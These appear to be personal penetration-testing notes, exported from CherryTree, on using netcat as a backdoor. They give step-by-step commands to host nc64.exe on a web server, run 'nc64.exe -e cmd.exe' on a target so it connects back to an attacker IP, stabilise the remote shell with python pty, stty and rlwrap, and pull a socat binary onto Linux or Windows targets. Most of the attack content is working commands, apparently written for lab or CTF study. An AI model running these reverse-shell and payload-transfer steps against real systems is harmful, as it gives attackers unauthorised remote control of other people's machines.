<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>netcat</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>netcat</h1><br/>nc -h<br /><br /><img src="images/19-1.png" alt="images/19-1.png" /><br /><br />nc -lvnp 8000<br />or<br />rlwrap nc -lvnp 8000<br /><br />l : Listening mode.<br />v : Verbose mode. Displays status messages in more detail.<br />n : Numeric-only IP address. No hostname resolution. DNS is not being used.<br />p : Port. Use to specify a particular port for listening.<br /><br /><img src="images/19-2.png" alt="images/19-2.png" /><br /><br /><br />netcat (often abbreviated to nc) is a computer networking utility for reading from and<br />writing to network connections using TCP or UDP. The command is designed to be a<br />dependable back-end that can be used directly or easily driven by other programs and<br />scripts. At the same time, it is a feature-rich network debugging and investigation<br />tool, since it can produce almost any kind of connection its user could need and has<br />several built-in capabilities. Its list of features includes port scanning,<br />transferring files, and port listening: as with any server, <strong>it can be used as a<br />backdoor.</strong><br /><br /><br />To use as Backdoor :<br /><br /><a href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------">https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------</a><br /><a href="https://github.com/CybeXRay/nc.exe">https://github.com/CybeXRay/nc.exe</a><br /><br />We will attempt to get a stable reverse shell. We will upload the nc64.exe binary to the target<br />machine and execute an interactive cmd.exe process on our listening port.<br /><br />We navigate to the folder and then start the simple HTTP server, then the netcat listener in a different tab by<br />using the following commands:<br /><br />sudo python3 -m http.server 80    ---------------- Web server for the Target machine to download the nc64.exe<br />sudo nc -lvnp 443							 ---------------- Our NC listner in the Attacker machine<br /><br /><br />Running the Backdoor in Target machine:<br />.\nc64.exe -e cmd.exe {Attacker_IP} 443   ------------As we are listening in 443<br /><br /><br /><br /><strong>Stabilizing the shell got using rougue server technique:</strong><br /><br />Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can<br />upgrade the terminal shell using the following command.<br /><br />script /dev/null -c bash<br /><br /><br /><strong><br />To Read/Connect A Server with a Port:</strong><br />(Can be used for Bind shells)<br /><br /><br />nc {Server_IP} {Port}<br /><br />Example:<br /><h3>nc 209.97.131.64 32522</h3><br /><br /><br /><strong>Stablization of Netcat:</strong><br /><br /><strong>A) Using Python</strong>--------------&gt;<br />(Linux)<br />python -c ‘import pty;pty.spawn(&quot;/bin/bash&quot;)’						(if required use python2 or python3)<br />export TERM=xterm																(this will give us access to term commands such as clear)<br />Ctrl+Z																						(Background the shell)<br />stty raw -echo; fg																	(This does two things: first, it turns off our own terminal echo. It then foregrounds the shell. )<br /><br />stty raw -echo; fg<br />This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. <br /><br /><strong>Note:</strong> As we have disabled echo in our own terminal. If the shell dies, we won&#39;t be able to see any inputs. Thus we need to use “<strong>reset</strong>” and enter.<br /><br /><strong>B) Using rlwrap-----------------&gt;</strong><br />(Mainly used for Windows)<br />rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell.<br />(Windows)<br />rlwrap nc -lvnp &lt;port&gt;<br />Then do the step 3 &amp; 4 to turn of our own system&#39;s echo<br /><br /><strong>C) Socat shell-----------------------&gt;</strong><br />(Mainly used for Linux, Windows shell will have same stability as netcat)<br /><br />First, transfer a socat static compiled binary program preferably over http server.<br />Download from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true</a><br />Then host it in our local python web server<br /><br />Linux target							:	wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat<br />Windows target(powershell)	: 	Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe<br /><br /><strong>Note:</strong> Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed <br /><br /><br /><strong>Changing Terminal Size, mainly used for text editors such as Vim or Nano to run properly:</strong><br /><br />In our own terminal run,<br />cd /tmp; stty -a<br />Get the values of “rows” &amp; “columns”<br /><br />Then in our target machine shell run,<br />stty rows &lt;number&gt;<br />stty cols &lt;number&gt;<br /><br /><br /><br /><br /><br /></div>
</body>
</html>
